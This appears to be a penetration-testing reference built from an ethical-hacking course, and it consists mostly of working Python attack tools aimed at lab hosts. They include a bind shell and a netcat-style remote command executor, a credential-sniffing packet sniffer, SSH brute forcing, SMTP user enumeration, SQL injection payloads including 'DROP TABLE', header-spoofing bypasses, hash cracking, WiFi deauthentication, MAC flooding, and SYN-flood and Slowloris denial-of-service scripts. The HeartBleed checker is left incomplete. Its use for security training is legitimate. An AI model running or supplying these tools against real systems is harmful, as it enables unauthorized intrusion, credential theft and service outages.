# Python for Penetration Testing

> **Legal Notice:** Only use these scripts on systems you own or have explicit written permission to test.

Python is the lingua franca of offensive security. Understanding how to build your own tools makes you a dramatically better tester — you understand exactly what's happening at the packet level, can customize behavior for specific targets, and aren't limited to what commercial tools support.

This reference covers Sections 19-27 of the Udemy course "Hacker Ético Profissional com Kali Linux v2025" by Vitor Mazuco.

---

## Setup & Libraries

```bash
# Python 3 is pre-installed on Kali
python3 --version

# Install key libraries
pip3 install scapy requests paramiko impacket python-whois netaddr pycryptodome

# Verify Scapy
python3 -c "from scapy.all import *; print('Scapy OK')"
```

**Core libraries:**

| Library | Use |
|---------|-----|
| `socket` | Raw TCP/UDP connections, DNS |
| `scapy` | Packet crafting, sniffing, wireless |
| `requests` | HTTP client, web app testing |
| `paramiko` | SSH client/server, SFTP |
| `impacket` | Windows protocols (SMB, NTLM, Kerberos) |
| `python-whois` | WHOIS queries |
| `pycryptodome` | Encryption, hashing |
| `subprocess` | Execute system commands |

---

## Module 1: Network Fundamentals

### DNS Lookups

```python
import socket
import whois

# Forward DNS resolution
print(socket.gethostbyname("example.com"))

# Reverse DNS
print(socket.gethostbyaddr("8.8.8.8"))

# All addresses for a hostname
print(socket.getaddrinfo("example.com", 80))

# WHOIS lookup
w = whois.whois("example.com")
print(f"Registrar: {w.registrar}")
print(f"Created: {w.creation_date}")
print(f"Expires: {w.expiration_date}")
print(f"Name Servers: {w.name_servers}")
```

### TCP Client

```python
import socket

def tcp_client(host, port, data="GET / HTTP/1.1\r\nHost: {}\r\n\r\n"):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        s.send(data.format(host).encode())
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        return response.decode(errors="ignore")
    finally:
        s.close()

print(tcp_client("10.10.0.25", 80)[:500])
```

### UDP Client

```python
import socket

def udp_client(host, port, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(data.encode(), (host, port))
        response, addr = s.recvfrom(4096)
        return response
    except socket.timeout:
        return b"No response (port filtered or closed)"
    finally:
        s.close()

# DNS query
print(udp_client("8.8.8.8", 53, "\x00\x01"))
```

### TCP Server / Bind Shell

```python
import socket
import subprocess
import threading

def handle_client(conn):
    conn.send(b"Shell ready\n")
    while True:
        try:
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() in ("exit", "quit"):
                break
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True
            )
            output = result.stdout + result.stderr or "No output\n"
            conn.send(output.encode())
        except Exception as e:
            conn.send(str(e).encode())
            break
    conn.close()

def bind_shell(port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    print(f"[*] Listening on port {port}")
    while True:
        conn, addr = s.accept()
        print(f"[+] Connection from {addr}")
        t = threading.Thread(target=handle_client, args=(conn,))
        t.start()
```

---

## Module 2: Port Scanner

```python
import socket
import threading
from queue import Queue
from datetime import datetime

open_ports = []
lock = threading.Lock()

def scan_port(host, port, timeout=0.5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    result = s.connect_ex((host, port))
    s.close()
    if result == 0:
        with lock:
            open_ports.append(port)
        print(f"[+] Port {port}/tcp open")

def threaded_scanner(host, start_port=1, end_port=1024, threads=100):
    q = Queue()
    for port in range(start_port, end_port + 1):
        q.put(port)

    def worker():
        while not q.empty():
            port = q.get()
            scan_port(host, port)
            q.task_done()

    print(f"[*] Scanning {host} ports {start_port}-{end_port}")
    print(f"[*] Started: {datetime.now()}")

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        thread_list.append(t)

    q.join()
    return sorted(open_ports)

# Usage
results = threaded_scanner("10.10.0.25", 1, 1024, threads=200)
print(f"\n[*] Scan complete. Open ports: {results}")
```

---

## Module 3: Netcat Clone

```python
#!/usr/bin/env python3
"""
Python Netcat replacement — connect or listen for command execution
Usage:
  Listen:  python3 netcat.py -l -p 4444
  Connect: python3 netcat.py -t 10.10.0.25 -p 4444
"""
import socket
import subprocess
import sys
import threading
import argparse

def client_mode(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print(f"[+] Connected to {host}:{port}")

    def recv():
        while True:
            data = s.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode())
            sys.stdout.flush()

    t = threading.Thread(target=recv)
    t.daemon = True
    t.start()

    while True:
        try:
            cmd = input()
            s.send((cmd + "\n").encode())
        except KeyboardInterrupt:
            break
    s.close()

def server_mode(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"[*] Listening on :{port}")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    while True:
        conn.send(b"$ ")
        cmd = conn.recv(4096).decode().strip()
        if cmd.lower() in ("exit", "quit", ""):
            break
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        conn.send(output.encode() or b"(no output)\n")
    conn.close()
    s.close()
```

---

## Module 4: Packet Sniffer

```python
from scapy.all import sniff, IP, TCP, UDP, Raw
import datetime

def packet_callback(pkt):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    if pkt.haslayer(IP):
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        proto = pkt[IP].proto

        if pkt.haslayer(TCP):
            src_port = pkt[TCP].sport
            dst_port = pkt[TCP].dport
            flags = pkt[TCP].flags
            print(f"[{timestamp}] TCP {src_ip}:{src_port} → {dst_ip}:{dst_port} [{flags}]")

        elif pkt.haslayer(UDP):
            src_port = pkt[UDP].sport
            dst_port = pkt[UDP].dport
            print(f"[{timestamp}] UDP {src_ip}:{src_port} → {dst_ip}:{dst_port}")

        # Extract plaintext credentials from HTTP
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode(errors="ignore")
            if "password" in payload.lower() or "passwd" in payload.lower():
                print(f"[!] CREDENTIAL DETECTED: {payload[:200]}")

# Sniff on lab interface
print("[*] Starting packet capture (Ctrl+C to stop)")
sniff(iface="docker0", prn=packet_callback, store=False)
```

---

## Module 5: IP/ICMP Decoder

```python
import struct
import socket
import os

class IP:
    def __init__(self, raw):
        header = struct.unpack("!BBHHHBBH4s4s", raw[:20])
        self.ver = header[0] >> 4
        self.ihl = (header[0] & 0xF) * 4
        self.tos = header[1]
        self.len = header[2]
        self.id = header[3]
        self.ttl = header[5]
        self.proto = header[6]
        self.src = socket.inet_ntoa(header[8])
        self.dst = socket.inet_ntoa(header[9])

class ICMP:
    def __init__(self, raw):
        header = struct.unpack("!BBHHH", raw[:8])
        self.type = header[0]
        self.code = header[1]
        self.checksum = header[2]
        self.id = header[3]
        self.seq = header[4]

    TYPES = {0: "Echo Reply", 3: "Dest Unreachable", 8: "Echo Request", 11: "Time Exceeded"}

def icmp_sniffer():
    # Create raw socket (requires root)
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        raw, addr = sniffer.recvfrom(65535)
        ip = IP(raw)
        icmp_data = raw[ip.ihl:]
        icmp = ICMP(icmp_data)
        type_str = ICMP.TYPES.get(icmp.type, f"Type {icmp.type}")
        print(f"{ip.src} → {ip.dst} | ICMP {type_str} | TTL={ip.ttl}")

# Run with: sudo python3 icmp_decoder.py
```

---

## Module 6: Credential Attacks

### SMTP VRFY User Enumeration

```python
import socket

def smtp_vrfy(host, port, usernames):
    """
    Use VRFY command to check if usernames exist on SMTP server.
    Works on Metasploitable 2 (Postfix with VRFY enabled).
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    banner = s.recv(1024).decode()
    print(f"[*] Connected: {banner.strip()}")

    valid_users = []
    for user in usernames:
        s.send(f"VRFY {user}\r\n".encode())
        response = s.recv(1024).decode()

        if response.startswith("252") or response.startswith("250"):
            print(f"[+] Valid user: {user} — {response.strip()}")
            valid_users.append(user)
        elif response.startswith("550"):
            print(f"[-] Invalid user: {user}")
        else:
            print(f"[?] Unknown: {user} — {response.strip()}")

    s.send(b"QUIT\r\n")
    s.close()
    return valid_users

# Test against Metasploitable 2
users = ["root", "admin", "user", "mail", "www-data", "nobody", "msfadmin"]
valid = smtp_vrfy("10.10.0.25", 25, users)
print(f"\n[*] Valid users found: {valid}")
```

### SSH Brute-Force with paramiko

```python
import paramiko
import threading
from queue import Queue

def ssh_brute(host, port, username, passwords):
    for password in passwords:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username,
                          password=password, timeout=3)
            print(f"[+] SUCCESS! {username}:{password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            print(f"[-] Failed: {password}")
        except Exception as e:
            print(f"[!] Error: {e}")
    return None

# Against Metasploitable 2 lab only
passwords = ["msfadmin", "password", "123456", "admin", "root"]
ssh_brute("10.10.0.25", 22, "msfadmin", passwords)
```

---

## Module 7: Web Application Assessment

### Directory Brute-Forcer

```python
import requests
import threading
from queue import Queue

found = []
q = Queue()

def dir_brute(base_url, wordlist_file, threads=50, extensions=None):
    exts = extensions or ["", ".php", ".html", ".txt", ".bak"]

    with open(wordlist_file) as f:
        words = [w.strip() for w in f if w.strip()]

    for word in words:
        for ext in exts:
            q.put(f"{word}{ext}")

    def worker():
        while not q.empty():
            path = q.get()
            url = f"{base_url}/{path}"
            try:
                r = requests.get(url, timeout=3, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    print(f"[{r.status_code}] {url}")
                    found.append((r.status_code, url))
            except requests.exceptions.RequestException:
                pass
            finally:
                q.task_done()

    thread_list = [threading.Thread(target=worker) for _ in range(threads)]
    for t in thread_list:
        t.daemon = True
        t.start()
    q.join()
    return found

# Usage against DVWA
results = dir_brute(
    "http://10.10.0.10",
    "/usr/share/wordlists/dirb/common.txt",
    threads=50
)
```

### Backup File Finder

```python
import requests

def find_backups(base_url, files=None, extensions=None):
    """Find forgotten backup files that reveal source code."""
    files = files or [
        "index", "config", "login", "admin", "database", "wp-config",
        "settings", "configuration", "setup", "install", "backup"
    ]
    extensions = extensions or [
        ".bak", ".old", ".orig", ".backup", "~", ".swp",
        ".php.bak", ".sql", ".zip", ".tar.gz", ".7z"
    ]

    for f in files:
        for ext in extensions:
            url = f"{base_url}/{f}{ext}"
            try:
                r = requests.get(url, timeout=3)
                if r.status_code == 200 and len(r.content) > 0:
                    print(f"[+] BACKUP FOUND: {url} ({len(r.content)} bytes)")
            except:
                pass

find_backups("http://10.10.0.10")
```

### HeartBleed Checker (CVE-2014-0160)

```python
import socket
import struct
import time

# HeartBleed PoC — checks if server is vulnerable (read-only, no exploitation)
def heartbleed_check(host, port=443):
    hello = bytes.fromhex(
        "16030200dc"  # TLS record header
        "0100d8"      # ClientHello length
        # ... full payload omitted for brevity
        # See: https://github.com/sensepost/heartbleed-poc
    )
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))
        s.send(hello)
        data = s.recv(1024)
        if b"\x18\x03" in data:
            print(f"[!] {host}:{port} may be VULNERABLE to HeartBleed!")
        else:
            print(f"[-] {host}:{port} does not appear vulnerable")
        s.close()
    except Exception as e:
        print(f"[!] Error: {e}")

# Check Metasploitable 2 (runs OpenSSL 1.0.1)
heartbleed_check("10.10.0.25", 443)
```

---

## Module 8: Wireless Pentesting with Scapy

> **Requires:** wireless adapter in monitor mode. Never run against networks you don't own.

### Enable Monitor Mode

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
# Or: sudo airmon-ng start wlan0
```

### 802.11 Frame Sniffer

```python
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt

def wifi_scanner(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        try:
            ssid = pkt[Dot11Elt].info.decode()
        except:
            ssid = "<hidden>"
        channel = int(ord(pkt[Dot11Elt:3].info))
        print(f"SSID: {ssid:30s} BSSID: {bssid} Channel: {channel}")

print("[*] Scanning for WiFi networks (Ctrl+C to stop)")
sniff(iface="wlan0mon", prn=wifi_scanner, store=False)
```

### Deauth Attack (Lab Only!)

```python
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_attack(target_mac, ap_mac, iface="wlan0mon", count=100):
    """
    Send deauthentication frames to disconnect a client from AP.
    Lab use only — disrupts wireless connectivity.
    """
    # Deauth to client
    pkt_client = RadioTap() / \
                 Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / \
                 Dot11Deauth(reason=7)
    # Deauth to AP (spoof client)
    pkt_ap = RadioTap() / \
             Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) / \
             Dot11Deauth(reason=7)

    print(f"[*] Sending {count} deauth frames to {target_mac}")
    sendp([pkt_client, pkt_ap], iface=iface, count=count, inter=0.1, verbose=0)
    print("[*] Done")
```

### MAC Address Flood

```python
from scapy.all import Ether, IP, ICMP, sendp, RandMAC

def mac_flood(iface="wlan0mon"):
    """
    Flood network with random MAC addresses.
    Can exhaust CAM table on unmanaged switches.
    Lab use only.
    """
    print("[*] Starting MAC flood (Ctrl+C to stop)")
    while True:
        pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP() / ICMP()
        sendp(pkt, iface=iface, verbose=0)
```

---

## Module 9: SQL Injection Detection

```python
import requests
from urllib.parse import urljoin

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
    "odbc sql", "sqlite_", "postgresql", "warning: pg_",
    "unclosed quotation", "quoted string not properly terminated"
]

PAYLOADS = [
    "'", '"', "' OR '1'='1", '" OR "1"="1',
    "' OR 1=1--", '" OR 1=1--',
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "1 AND 1=1", "1 AND 1=2",
    "' AND SLEEP(3)--",
]

def sqli_scan(base_url, params):
    """Test URL parameters for SQL injection."""
    for param in params:
        for payload in PAYLOADS:
            test_params = {p: payload if p == param else "test" for p in params}
            try:
                r = requests.get(base_url, params=test_params, timeout=5)
                body = r.text.lower()

                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        print(f"[!] SQL ERROR detected!")
                        print(f"    URL: {r.url}")
                        print(f"    Payload: {payload}")
                        print(f"    Signature: {sig}")
                        break

                # Time-based blind detection
                if "sleep" in payload.lower() and r.elapsed.total_seconds() > 2:
                    print(f"[!] TIME-BASED SQLi: {r.url} (delay={r.elapsed.total_seconds():.1f}s)")

            except Exception as e:
                pass

# Test against DVWA (must set security to low first)
sqli_scan("http://10.10.0.10/dvwa/vulnerabilities/sqli/", {"id": "1", "Submit": "Submit"})
```

---

## Module 10: HTTP Header Manipulation

```python
import requests

def header_bypass_test(url):
    """Test common header-based bypass techniques."""
    test_cases = [
        # X-Forwarded-For bypass (localhost whitelist)
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "::1"},
        {"X-Real-IP": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},

        # IP spoofing
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},

        # WAF evasion via user-agent
        {"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"},
        {"User-Agent": "Mozilla/5.0 (compatible; bingbot/2.0)"},

        # Referer-based bypass
        {"Referer": "https://www.google.com/"},
        {"Referer": url},

        # Content-Type confusion
        {"Content-Type": "application/json; charset=utf-8"},
    ]

    baseline = requests.get(url, timeout=5)
    print(f"[*] Baseline: {baseline.status_code} ({len(baseline.content)} bytes)")

    for headers in test_cases:
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code != baseline.status_code or len(r.content) != len(baseline.content):
                print(f"[!] DIFFERENT RESPONSE with headers {headers}:")
                print(f"    Status: {r.status_code} | Size: {len(r.content)}")
        except:
            pass

header_bypass_test("http://10.10.0.10/dvwa/")
```

---

## Module 11: Cryptography & Hashing

```python
import hashlib
from Crypto.Cipher import AES, DES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64

# --- Hashing ---
def hash_string(text, algorithm="sha256"):
    h = hashlib.new(algorithm)
    h.update(text.encode())
    return h.hexdigest()

print(hash_string("password123", "md5"))     # MD5 (insecure)
print(hash_string("password123", "sha256"))  # SHA-256
print(hash_string("password123", "sha512"))  # SHA-512

# All available algorithms
print(hashlib.algorithms_available)

# --- AES Encryption ---
def aes_encrypt(plaintext, key=None):
    if key is None:
        key = get_random_bytes(32)  # AES-256
    cipher = AES.new(key, AES.MODE_CBC)
    ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct).decode(), key

def aes_decrypt(ciphertext_b64, key):
    data = base64.b64decode(ciphertext_b64)
    iv, ct = data[:16], data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    return unpad(cipher.decrypt(ct), AES.block_size).decode()

ct, key = aes_encrypt("Secret message")
print(f"Encrypted: {ct}")
print(f"Decrypted: {aes_decrypt(ct, key)}")

# --- Password hash cracking (dictionary) ---
def crack_hash(target_hash, wordlist, algorithm="md5"):
    with open(wordlist) as f:
        for word in f:
            word = word.strip()
            attempt = hashlib.new(algorithm, word.encode()).hexdigest()
            if attempt == target_hash:
                print(f"[+] Cracked! Hash: {target_hash} = '{word}'")
                return word
    print("[-] Not found in wordlist")
    return None

# Example: crack MD5 hash
crack_hash("5f4dcc3b5aa765d61d8327deb882cf99",  # "password"
           "/usr/share/wordlists/rockyou.txt",
           "md5")
```

---

## Module 12: DoS Scripting (Lab Only)

> **Warning:** Never use against real systems. Lab environment only. These demonstrate vulnerability, not attack capability.

```python
import socket
import threading
import random
import time

def syn_flood(target_ip, target_port, duration=10):
    """
    Simulate SYN flood (TCP half-open) — lab demonstration only.
    Real attacks require raw sockets and root; this is a connection flood.
    """
    print(f"[*] SYN flood simulation against {target_ip}:{target_port} for {duration}s")
    end_time = time.time() + duration
    connections = []

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect_ex((target_ip, target_port))
            connections.append(s)
            if len(connections) % 100 == 0:
                print(f"[*] {len(connections)} connections opened")
        except:
            pass

    print(f"[*] Done. Closing {len(connections)} connections.")
    for s in connections:
        try:
            s.close()
        except:
            pass

def slowloris(target_ip, target_port=80, connections=200, duration=30):
    """
    Slowloris HTTP DoS — holds connections open by sending partial HTTP headers.
    """
    headers = [
        f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n",
        "X-a: b\r\n",
    ]
    sockets = []
    print(f"[*] Slowloris against {target_ip}:{target_port}")

    for _ in range(connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(headers[0].encode())
            sockets.append(s)
        except:
            pass

    end_time = time.time() + duration
    while time.time() < end_time:
        for s in sockets[:]:
            try:
                s.send(headers[1].encode())
            except:
                sockets.remove(s)
        print(f"[*] Maintaining {len(sockets)} connections")
        time.sleep(10)
```

---

## Resources

- [Udemy: Hacker Ético Profissional — Sections 19-27](https://www.udemy.com/course/hacker-etico-profissional/)
- [Scapy Documentation](https://scapy.readthedocs.io)
- [Black Hat Python (book)](https://nostarch.com/black-hat-python2E) — Justin Seitz
- [Violent Python (book)](https://www.elsevier.com/books/violent-python/oconnor/978-1-59749-957-6)
- [Python for Hackers — freeCodeCamp](https://www.freecodecamp.org/news/python-for-hackers/)
- [Paramiko Documentation](https://www.paramiko.org)
- [Impacket GitHub](https://github.com/fortra/impacket)
